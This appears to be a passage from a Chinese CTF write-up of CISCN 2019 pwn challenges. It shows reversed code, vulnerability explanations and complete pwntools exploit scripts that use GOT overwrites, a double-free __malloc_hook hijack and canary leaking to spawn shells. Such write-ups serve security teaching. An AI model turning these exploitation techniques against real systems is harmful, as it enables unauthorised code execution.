<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x20100</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  __isoc99_sscanf(&amp;unk_6020C0, <span class="string">&quot;%c&quot;</span>, &amp;v5);</span><br><span class="line">  *(_DWORD *)STRUC = v5 + <span class="number">0x60000</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x30100</span>;         <span class="comment">// pos</span></span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x20000</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  *(_DWORD *)STRUC = <span class="number">0x10100</span>;</span><br><span class="line">  STRUC += <span class="number">4LL</span>;</span><br><span class="line">  steps = (STRUC - (<span class="type">signed</span> __int64)struc) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>在进行运算时,分别进行五步操作，以STRUC(control)里的内容为控制跳转和参数，0x20100 即运行<code>get_value(0x0,0x1)</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)steps;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= steps )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v0 = *(_DWORD *)(<span class="number">4LL</span> * i + STRUC);</span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD))func_list[*(_DWORD *)(<span class="number">4LL</span> * i + STRUC) &gt;&gt; <span class="number">16</span>])(</span><br><span class="line">    <span class="built_in">BYTE1</span>(v0),</span><br><span class="line">    (<span class="type">unsigned</span> __int8)*(_DWORD *)(<span class="number">4LL</span> * i + STRUC));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>综合下来，五步操作十分类似CPU运行一条指令的五个步骤:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">取值get_value-&gt;译码initial_space-&gt;执行operation-&gt;取值get_value-&gt;写回write_back</span><br></pre></td></tr></table></figure>

<p>上述是对babycalc逆向的过程，漏洞点有点隐蔽，在输入folumla长度的判断上:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)size &lt;= <span class="number">0x30</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(formula, <span class="number">0</span>, <span class="number">0x30uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input formula to calc:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; size - <span class="number">1</span> &gt;= i; ++i )           <span class="comment">// overflow</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="type">void</span> *)((<span class="type">signed</span> <span class="type">int</span>)i + <span class="number">0x602160LL</span>), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( formula[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      size = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>当size为0时，size-1&lt;0，可以无限制输入，实现在.bss段上的无限长写 利用的思路就是通过程序中提供的写操作，将<code>free</code>写成<code>puts</code>实现泄露 再将<code>malloc</code>写成<code>one_gadget</code>拿到shell.</p>
<p>至于为什么是写<code>malloc</code>，经过尝试了很多，只有在<code>malloc</code>这里，onegadget成功了</p>
<p>当然肯定有劫持的其他方法，因为.bss段的无限制写使我们可以控制babycalc控制运算的三个全局变量，只是构造有些繁琐，就取巧了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;137&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./babycalc&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babycalc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">        gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">size,formula</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size of your formula:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input formula to calc:\n&#x27;</span>)</span><br><span class="line">    p.send(formula)</span><br><span class="line"><span class="comment"># calc(5,&quot;10+20&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow to leaking libc</span></span><br><span class="line">payload = <span class="string">&quot;&#123;0&#125;.0&quot;</span>.<span class="built_in">format</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">calc(<span class="number">0</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Invalid input ..\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Invalid input ..\n&#x27;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one = libc.address+<span class="number">0x45216</span></span><br><span class="line"><span class="comment">#one = libc.address+0x4526a</span></span><br><span class="line"><span class="comment">#one = libc.address+0xf02a4</span></span><br><span class="line"><span class="comment">#one = libc.address+0xf1147</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x400D9D\n b*0x400C29\n b*0x400C67&#x27;)</span></span><br><span class="line"><span class="comment"># problem</span></span><br><span class="line">formula = <span class="string">&quot;&#123;0&#125;+&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(one&amp;<span class="number">0xffffffff</span>),<span class="built_in">str</span>((one&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">payload = formula</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&quot;malloc&quot;</span>])+p64(<span class="number">0</span>)</span><br><span class="line">calc(<span class="number">0</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn3-weapon-✅"><a href="#pwn3-weapon-✅" class="headerlink" title="pwn3-weapon ✅"></a>pwn3-weapon ✅</h3><p>常规的double free劫持<code>__malloc_hook</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,name</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&#x27;Give me the name: \n&#x27;</span>)</span><br><span class="line">    se(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    ru(<span class="string">&#x27;index: \n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fight</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">&#x27;weapon:\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bookdoor</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&quot;Command: \n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    ru(<span class="string">&quot;weapon:\n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">    create(<span class="number">0x100</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fight(<span class="number">1</span>)</span><br><span class="line">    fight(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&#x27;attack_times: &#x27;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(rud(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)-<span class="number">0x3c4b78</span></span><br><span class="line">    log.info(<span class="string">&#x27;libc.address:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    __malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    one = libc.address+<span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fight(<span class="number">4</span>)</span><br><span class="line">    fight(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((<span class="number">0xf0</span>-<span class="number">0x60</span>)/<span class="number">2</span>):</span><br><span class="line">        bookdoor(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    z([<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(proc_base+<span class="number">0x129D</span>)])</span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="number">1</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x70</span>)+p64(__malloc_hook-<span class="number">0x23</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x60</span>,<span class="number">0x3</span>*<span class="string">&#x27;\x00&#x27;</span>+p64(one)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fight(<span class="number">2</span>)</span><br><span class="line">    fight(<span class="number">2</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.binary = <span class="string">&#x27;./pwn3&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> io.libs()</span><br><span class="line">        proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/PWN/pwn3/pwn3&#x27;</span>]</span><br><span class="line">        log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">        libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>]	</span><br><span class="line">        log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">        exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>





<h3 id="pwn4-pwngril-✅"><a href="#pwn4-pwngril-✅" class="headerlink" title="pwn4-pwngril ✅"></a>pwn4-pwngril ✅</h3><p>溢出，通过<code>scanf(&quot;%d&quot;,&amp;a)</code> 输入”+”绕过T，不写入任何值，进而泄露canary，之后ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">command = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">ru(<span class="string">&quot;do you would to sort your girlfriends?[Y/N/@]&quot;</span>)</span><br><span class="line">se(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;please answer the question1:\n&#x27;</span>)</span><br><span class="line">se(<span class="string">&#x27;^&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;please answer the question2:&#x27;</span>)</span><br><span class="line">se(<span class="string">&#x27;^&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;please input your name:&#x27;</span>)</span><br><span class="line">se(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;how many girlfriends do you have?\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;this is the sort result:&#x27;</span>)</span><br><span class="line">res = []</span><br><span 